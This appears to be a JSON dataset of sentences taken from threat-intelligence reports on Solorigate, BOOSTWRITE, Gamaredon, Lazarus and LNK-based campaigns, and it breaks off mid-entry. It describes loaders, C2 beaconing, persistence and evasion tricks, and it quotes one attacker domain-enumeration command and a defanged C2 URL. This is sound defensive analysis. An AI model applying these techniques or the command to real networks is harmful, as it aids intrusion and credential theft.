    {
        "id": "cti_reports_filtered/r-326.md:::S39",
        "text": "- The domain name of the device\n",
        "type": "",
        "report": "r-326",
        "line": 39,
        "index": 925
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S40",
        "text": "- The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\n",
        "type": "",
        "report": "r-326",
        "line": 40,
        "index": 926
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S41",
        "text": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "type": "",
        "report": "r-326",
        "line": 41,
        "index": 927
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S42",
        "text": "Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",
        "type": "",
        "report": "r-326",
        "line": 42,
        "index": 928
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S43",
        "text": "Possible URIs that can be generated follow these formats:\n",
        "type": "",
        "report": "r-326",
        "line": 43,
        "index": 929
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S44",
        "text": "Here are examples of final URLs generated by the backdoor:\n",
        "type": "",
        "report": "r-326",
        "line": 44,
        "index": 930
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S45",
        "text": "Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.",
        "type": "",
        "report": "r-326",
        "line": 45,
        "index": 931
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S46",
        "text": "It then sends this JSON document to the C2 server.",
        "type": "",
        "report": "r-326",
        "line": 46,
        "index": 932
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S47",
        "text": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "type": "",
        "report": "r-326",
        "line": 47,
        "index": 933
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S48",
        "text": "The C2 might also respond with information about an additional C2 address to report to.",
        "type": "",
        "report": "r-326",
        "line": 48,
        "index": 934
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S49",
        "text": "The backdoor accepts the following commands:\n",
        "type": "",
        "report": "r-326",
        "line": 49,
        "index": 935
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S50",
        "text": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "type": "",
        "report": "r-326",
        "line": 50,
        "index": 936
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S51",
        "text": "The command CollectSystemDescription retrieves the following information:\n",
        "type": "",
        "report": "r-326",
        "line": 51,
        "index": 937
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S52",
        "text": "- Local Computer Domain name\n",
        "type": "",
        "report": "r-326",
        "line": 52,
        "index": 938
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S53",
        "text": "- Administrator Account SID\n",
        "type": "",
        "report": "r-326",
        "line": 53,
        "index": 939
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S54",
        "text": "- HostName\n",
        "type": "",
        "report": "r-326",
        "line": 54,
        "index": 940
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S55",
        "text": "- Username\n",
        "type": "",
        "report": "r-326",
        "line": 55,
        "index": 941
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S56",
        "text": "- OS Version\n",
        "type": "",
        "report": "r-326",
        "line": 56,
        "index": 942
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S57",
        "text": "- System Directory\n",
        "type": "",
        "report": "r-326",
        "line": 57,
        "index": 943
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S58",
        "text": "- Device uptime\n",
        "type": "",
        "report": "r-326",
        "line": 58,
        "index": 944
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S59",
        "text": "- Information about the network interfaces\n",
        "type": "",
        "report": "r-326",
        "line": 59,
        "index": 945
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S60",
        "text": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "type": "",
        "report": "r-326",
        "line": 60,
        "index": 946
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S61",
        "text": "To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration.",
        "type": "",
        "report": "r-326",
        "line": 61,
        "index": 947
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S62",
        "text": "C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=\u201dDomain Admins\u201d) member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log\n",
        "type": "",
        "report": "r-326",
        "line": 62,
        "index": 948
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S63",
        "text": "Lateral movement was observed via PowerShell remote task creation, as detailed by FireEye and Volexity:\n",
        "type": "",
        "report": "r-326",
        "line": 63,
        "index": 949
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S64",
        "text": "Persistence is achieved via backdoors deployed via various techniques:\n",
        "type": "",
        "report": "r-326",
        "line": 64,
        "index": 950
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S65",
        "text": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "type": "",
        "report": "r-326",
        "line": 65,
        "index": 951
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S66",
        "text": "We continue to investigate these payloads, which are detected as Trojan:Win32/Solorigate.A!dha, as the situation continues to unfold.\n",
        "type": "",
        "report": "r-326",
        "line": 66,
        "index": 952
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S0",
        "text": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate \u2018Dwrite.dll\u2019 provided by the Microsoft DirectX Typography Services.",
        "type": "",
        "report": "r-349",
        "line": 0,
        "index": 953
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S1",
        "text": "The application loads the \u2018gdi\u2019 library, which loads the \u2018gdiplus\u2019 library, which ultimately loads \u2018Dwrite\u2019.",
        "type": "",
        "report": "r-349",
        "line": 1,
        "index": 954
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S2",
        "text": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "type": "",
        "report": "r-349",
        "line": 2,
        "index": 955
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S3",
        "text": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "type": "",
        "report": "r-349",
        "line": 3,
        "index": 956
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S4",
        "text": "To accomplish this task, the malware first generates a random file name to be used as a text log under the current user's %TEMP% directory; this filename starts with ~rdf and is followed by a set of random numbers.",
        "type": "",
        "report": "r-349",
        "line": 4,
        "index": 957
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S5",
        "text": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "type": "",
        "report": "r-349",
        "line": 5,
        "index": 958
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S6",
        "text": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "type": "",
        "report": "r-349",
        "line": 6,
        "index": 959
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S7",
        "text": "The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.",
        "type": "",
        "report": "r-349",
        "line": 7,
        "index": 960
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S8",
        "text": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "type": "",
        "report": "r-349",
        "line": 8,
        "index": 961
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S9",
        "text": "The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.",
        "type": "",
        "report": "r-349",
        "line": 9,
        "index": 962
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S10",
        "text": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "type": "",
        "report": "r-349",
        "line": 10,
        "index": 963
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S11",
        "text": "An example of the file content is shown in Figure 1:\n",
        "type": "",
        "report": "r-349",
        "line": 11,
        "index": 964
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S12",
        "text": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.\n",
        "type": "",
        "report": "r-349",
        "line": 12,
        "index": 965
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S13",
        "text": "The malware decrypts and loads two payload DLLs.",
        "type": "",
        "report": "r-349",
        "line": 13,
        "index": 966
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S14",
        "text": "One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.\n",
        "type": "",
        "report": "r-349",
        "line": 14,
        "index": 967
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S15",
        "text": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "type": "",
        "report": "r-349",
        "line": 15,
        "index": 968
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S16",
        "text": "RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility\u2019s DLL load order, launching each time the \u2018Aloha Command Center Client\u2019 is executed on an impacted system.",
        "type": "",
        "report": "r-349",
        "line": 16,
        "index": 969
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S17",
        "text": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "type": "",
        "report": "r-349",
        "line": 17,
        "index": 970
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S18",
        "text": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "type": "",
        "report": "r-349",
        "line": 18,
        "index": 971
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S19",
        "text": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "type": "",
        "report": "r-349",
        "line": 19,
        "index": 972
    },
    {
        "id": "cti_reports_filtered/r-349.md:::S20",
        "text": "This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).",
        "type": "",
        "report": "r-349",
        "line": 20,
        "index": 973
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S0",
        "text": "The threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spear-phishing.\n",
        "type": "",
        "report": "r-385",
        "line": 0,
        "index": 974
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S1",
        "text": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:\n",
        "type": "",
        "report": "r-385",
        "line": 1,
        "index": 975
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S2",
        "text": "Both RAR archives bundle two malicious LNK files.",
        "type": "",
        "report": "r-385",
        "line": 2,
        "index": 976
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S3",
        "text": "In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results.",
        "type": "",
        "report": "r-385",
        "line": 3,
        "index": 977
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S4",
        "text": "The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.\n",
        "type": "",
        "report": "r-385",
        "line": 4,
        "index": 978
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S5",
        "text": "The following shows the overall process flow when executing the malicious LNK file.\n",
        "type": "",
        "report": "r-385",
        "line": 5,
        "index": 979
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S6",
        "text": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "type": "",
        "report": "r-385",
        "line": 6,
        "index": 980
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S7",
        "text": "Here is the list of commands that will be executed:\n",
        "type": "",
        "report": "r-385",
        "line": 7,
        "index": 981
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S8",
        "text": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.\n",
        "type": "",
        "report": "r-385",
        "line": 8,
        "index": 982
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S9",
        "text": "- Copy content of \"certutil.exe\" into \"gosia.exe\" ( \"*ertu*.exe is used to bypass security detection).\n",
        "type": "",
        "report": "r-385",
        "line": 9,
        "index": 983
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S10",
        "text": "- Look for the base64 blob using \"findstr.exe\" and write it to \"cSi1rouy4.tmp\".\n",
        "type": "",
        "report": "r-385",
        "line": 10,
        "index": 984
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S11",
        "text": "- Decode content of \"cSi1rouy4.tmp\" using \"gosia.exe -decode\" (certutil.exe -decode) and write it to \"o423DFDS4.tmp\".\n",
        "type": "",
        "report": "r-385",
        "line": 11,
        "index": 985
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S12",
        "text": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .\n",
        "type": "",
        "report": "r-385",
        "line": 12,
        "index": 986
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S13",
        "text": "- Copy \"66DF3DFG.tmp\" and \"34fDKfSD38.js\" files into \"C:\\Users\\Public\\Downloads\" directory.\n",
        "type": "",
        "report": "r-385",
        "line": 13,
        "index": 987
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S14",
        "text": "- Execute the JS file by calling Wscript.\n",
        "type": "",
        "report": "r-385",
        "line": 14,
        "index": 988
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S15",
        "text": "- Open the decoy document.\n",
        "type": "",
        "report": "r-385",
        "line": 15,
        "index": 989
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S16",
        "text": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "type": "",
        "report": "r-385",
        "line": 16,
        "index": 990
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S17",
        "text": "The only difference is the name of the tmp files and name of certutil.exe which in this new case is \"gosia.exe\", while in the March campaign the name was \"mosia.exe\".\n",
        "type": "",
        "report": "r-385",
        "line": 17,
        "index": 991
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S18",
        "text": "Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations.",
        "type": "",
        "report": "r-385",
        "line": 18,
        "index": 992
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S19",
        "text": "Running each of them would show a different decoy document.",
        "type": "",
        "report": "r-385",
        "line": 19,
        "index": 993
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S20",
        "text": "The JavaScript file performs the following commands:\n",
        "type": "",
        "report": "r-385",
        "line": 20,
        "index": 994
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S21",
        "text": "- Create \"d3reEW.exe\" in \"C:\\Users\\Public\\Downloads\" and store \"cmd /c ipconfig\" in it.\n",
        "type": "",
        "report": "r-385",
        "line": 21,
        "index": 995
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S22",
        "text": "- Execute the dropped \"svchast.exe\".\n",
        "type": "",
        "report": "r-385",
        "line": 22,
        "index": 996
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S23",
        "text": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".\n",
        "type": "",
        "report": "r-385",
        "line": 23,
        "index": 997
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S24",
        "text": "- Add \"officeupdate.exe\" to scheduled tasks.\n",
        "type": "",
        "report": "r-385",
        "line": 24,
        "index": 998
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S25",
        "text": "- Send a POST request to a hardcoded URL with \"d3reEW.exe\" as data.\n",
        "type": "",
        "report": "r-385",
        "line": 25,
        "index": 999
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S26",
        "text": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".",
        "type": "",
        "report": "r-385",
        "line": 26,
        "index": 1000
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S27",
        "text": "In fact, this shellcode is a wrapper around the final shellcode.",
        "type": "",
        "report": "r-385",
        "line": 27,
        "index": 1001
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S28",
        "text": "It performs some checks and then calls the final shellcode.\n",
        "type": "",
        "report": "r-385",
        "line": 28,
        "index": 1002
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S29",
        "text": "The final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.\n",
        "type": "",
        "report": "r-385",
        "line": 29,
        "index": 1003
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S30",
        "text": "Finally it calls \"CreateThread\" to create a thread within its memory space to make HTTPS requests to its C&C server.",
        "type": "",
        "report": "r-385",
        "line": 30,
        "index": 1004
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S31",
        "text": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "type": "",
        "report": "r-385",
        "line": 31,
        "index": 1005
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S32",
        "text": "While most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.\n",
        "type": "",
        "report": "r-385",
        "line": 32,
        "index": 1006
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S33",
        "text": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "type": "",
        "report": "r-385",
        "line": 33,
        "index": 1007
    },
    {
        "id": "cti_reports_filtered/r-385.md:::S34",
        "text": "Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.\n",
        "type": "",
        "report": "r-385",
        "line": 34,
        "index": 1008
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S0",
        "text": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "type": "",
        "report": "r-398",
        "line": 0,
        "index": 1009
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S1",
        "text": "Using Outlook macros to deliver malware is something we rarely see while investigating malicious campaigns.",
        "type": "",
        "report": "r-398",
        "line": 1,
        "index": 1010
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S2",
        "text": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "type": "",
        "report": "r-398",
        "line": 2,
        "index": 1011
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S3",
        "text": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "type": "",
        "report": "r-398",
        "line": 3,
        "index": 1012
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S4",
        "text": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "type": "",
        "report": "r-398",
        "line": 4,
        "index": 1013
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S5",
        "text": "The malicious code is executed once the Application.Startup event is received.",
        "type": "",
        "report": "r-398",
        "line": 5,
        "index": 1014
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S6",
        "text": "They have been using this module in three different ways to send malicious email to:\n",
        "type": "",
        "report": "r-398",
        "line": 6,
        "index": 1015
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S7",
        "text": "- Everyone in the victim\u2019s address book\n",
        "type": "",
        "report": "r-398",
        "line": 7,
        "index": 1016
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S8",
        "text": "- Everyone within the same organization\n",
        "type": "",
        "report": "r-398",
        "line": 8,
        "index": 1017
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S9",
        "text": "- A predefined list of targets\n",
        "type": "",
        "report": "r-398",
        "line": 9,
        "index": 1018
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S10",
        "text": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "type": "",
        "report": "r-398",
        "line": 10,
        "index": 1019
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S11",
        "text": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "type": "",
        "report": "r-398",
        "line": 11,
        "index": 1020
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S12",
        "text": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "type": "",
        "report": "r-398",
        "line": 12,
        "index": 1021
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S13",
        "text": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "type": "",
        "report": "r-398",
        "line": 13,
        "index": 1022
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S14",
        "text": "We\u2019ve seen both .docx and .lnk files being used as attachments.",
        "type": "",
        "report": "r-398",
        "line": 14,
        "index": 1023
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S15",
        "text": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "type": "",
        "report": "r-398",
        "line": 15,
        "index": 1024
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S16",
        "text": "Figure 3 shows an email generated by this malicious component.",
        "type": "",
        "report": "r-398",
        "line": 16,
        "index": 1025
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S17",
        "text": "The email contains both English and Russian text.",
        "type": "",
        "report": "r-398",
        "line": 17,
        "index": 1026
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S18",
        "text": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "type": "",
        "report": "r-398",
        "line": 18,
        "index": 1027
    },
    {
        "id": "cti_reports_filtered/r-398.md:::S19",
        "text": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "type": "",
        "report": "r-398",
        "line": 19,
        "index": 1028
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S0",
        "text": "We identified two phishing documents: \u201cLockheed_Martin_JobOpportunities.docx\u201d and \u201cSalary_Lockheed_Martin_job_opportunities_confidential.doc\u201d.",
        "type": "",
        "report": "r-414",
        "line": 0,
        "index": 1029
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S1",
        "text": "Both variants were authored by the same user, named \u201cMickey\u201d.",
        "type": "",
        "report": "r-414",
        "line": 1,
        "index": 1030
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S2",
        "text": "The methodology used for control flow hijack and the macro content is similar across both samples.\n",
        "type": "",
        "report": "r-414",
        "line": 2,
        "index": 1031
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S3",
        "text": "The macro uses aliases to rename the APIs that it uses (fig. 2).\n",
        "type": "",
        "report": "r-414",
        "line": 3,
        "index": 1032
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S4",
        "text": "The initial entry point for the macro is via the ActiveX Frame1_Layout to automatically execute once ActiveX control is enabled (fig. 3).\n",
        "type": "",
        "report": "r-414",
        "line": 4,
        "index": 1033
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S5",
        "text": "The macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows media.",
        "type": "",
        "report": "r-414",
        "line": 5,
        "index": 1034
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S6",
        "text": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).\n",
        "type": "",
        "report": "r-414",
        "line": 6,
        "index": 1035
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S7",
        "text": "The macro uses a check for a document variable before entering its main functionality block.",
        "type": "",
        "report": "r-414",
        "line": 7,
        "index": 1036
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S8",
        "text": "This variable is set at the end to ensure that subsequent opening of the document does not execute it again.\n",
        "type": "",
        "report": "r-414",
        "line": 8,
        "index": 1037
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S9",
        "text": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "type": "",
        "report": "r-414",
        "line": 9,
        "index": 1038
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S10",
        "text": "Other variants have used the UuidFromStringA function to decode the embedded payload and write it to an executable Heap.\n",
        "type": "",
        "report": "r-414",
        "line": 10,
        "index": 1039
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S11",
        "text": "The decoded shellcode then overwrites the WMIsAvailableOffline function from WMVCORE.dll by retrieving its address and changing its memory permissions.",
        "type": "",
        "report": "r-414",
        "line": 11,
        "index": 1040
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S12",
        "text": "The callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from the PEB structure of the current process via NtQueryInformationProcess, and then patching the _fnDWORD pointer to point to WMIsAvailableOffline.",
        "type": "",
        "report": "r-414",
        "line": 12,
        "index": 1041
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S13",
        "text": "Whenever winword makes any graphical call, the shellcode executes.",
        "type": "",
        "report": "r-414",
        "line": 13,
        "index": 1042
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S14",
        "text": "This technique to hijack control flow has also been used by other sophisticated attackers such as FinFisher.",
        "type": "",
        "report": "r-414",
        "line": 14,
        "index": 1043
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S15",
        "text": "Lazarus has also used other novel methods to execute shellcode such as by using the function EnumSystemLocalesA as a callback to shellcode written to executable heap.",
        "type": "",
        "report": "r-414",
        "line": 15,
        "index": 1044
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S16",
        "text": "The macro then sets a document variable to ensure that subsequent runs would not execute the shellcode decode and the KernelCllbackTable hijack again.",
        "type": "",
        "report": "r-414",
        "line": 16,
        "index": 1045
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S17",
        "text": "It also retrieves a decoy document from https://markettrendingcenter[.]com/lk_job_oppor[.]docx and displays it (fig. 7.)\n",
        "type": "",
        "report": "r-414",
        "line": 17,
        "index": 1046
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S18",
        "text": "The shellcode mainly sets up a periodic beacon out to https://markettrendingcenter[.]com/member[.]htm by creating a new staging folder C:\\WMAuthorization , writing a vbs file (WMVxEncd.vbs) to it, and creating a corresponding Scheduled task to run the vbs file every 20 minutes (fig. 8).",
        "type": "",
        "report": "r-414",
        "line": 18,
        "index": 1047
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S19",
        "text": "shellObj is the Wscript.Shell object that the vbs file uses to execute the beacon command.",
        "type": "",
        "report": "r-414",
        "line": 19,
        "index": 1048
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S20",
        "text": "Here, WMPlaybackSrv is a renamed wscript.exe and WindowsMediaPlayerVxEncdSrv is a renamed mshta.exe.",
        "type": "",
        "report": "r-414",
        "line": 20,
        "index": 1049
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S21",
        "text": "Another variant of the campaign uses the lolbin wuauclt.\n",
        "type": "",
        "report": "r-414",
        "line": 21,
        "index": 1050
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S22",
        "text": "Earlier variants have used a copy of wmic.\n",
        "type": "",
        "report": "r-414",
        "line": 22,
        "index": 1051
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S23",
        "text": "Additional vendors have also identified a variant that uses pcalua.exe.\n",
        "type": "",
        "report": "r-414",
        "line": 23,
        "index": 1052
    },
    {
        "id": "cti_reports_filtered/r-414.md:::S24",
        "text": "Unfortunately, we were unable to get further details about the remote htm payload as it returns a 404 error.\n",
        "type": "",
        "report": "r-414",
        "line": 24,
        "index": 1053
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S0",
        "text": "The malicious document contains two payloads as encrypted string arrays embedded in Visual Basic macro code.",
        "type": "",
        "report": "r-416",
        "line": 0,
        "index": 1054
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S1",
        "text": "The payloads are present as encrypted string arrays that are decrypted in memory, written to disk and launched in sequence (second stage malicious binary launched first and then the decoy document).\n",
        "type": "",
        "report": "r-416",
        "line": 1,
        "index": 1055
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S2",
        "text": "The VBA Macro code is self-executing and configured to execute when the OLE document (MS Word doc) is opened (via \u201cSub AutoOpen()\u201d).",
        "type": "",
        "report": "r-416",
        "line": 2,
        "index": 1056
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S3",
        "text": "The AutoOpen() function in the VBA Macro performs the following tasks in the sequence listed:\n",
        "type": "",
        "report": "r-416",
        "line": 3,
        "index": 1057
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S4",
        "text": "- Decodes the target file path of the second stage binary payload.",
        "type": "",
        "report": "r-416",
        "line": 4,
        "index": 1058
    },
    {
        "id": "cti_reports_filtered/r-416.md:::S5",
